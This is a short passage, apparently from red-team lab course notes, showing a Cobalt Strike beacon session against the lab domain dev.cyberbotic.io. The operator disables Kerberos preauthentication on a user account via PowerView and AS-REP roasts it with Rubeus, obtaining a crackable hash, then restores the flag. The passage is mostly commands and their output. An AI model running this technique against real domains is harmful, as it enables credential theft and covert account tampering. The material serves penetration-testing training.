This is the same idea as above. Modify the User Account Control value on the account to disable preauthentication and then ASREProast it.

```
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value                                                     
----                           -----                                                     NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

beacon> powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512                              
DONT_EXPIRE_PASSWORD           65536                              
DONT_REQ_PREAUTH               4194304

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:jadams /nowrap

[*] Action: AS-REP roasting

[*] Target User            : jadams
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for AS-REP roastable users

[*] SamAccountName         : jadams
[*] DistinguishedName      : CN=Joyce Adams,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\jadams'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$jadams@dev.cyberbotic.io:5E0549 [...snip...] 131FDC

beacon> powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536
```

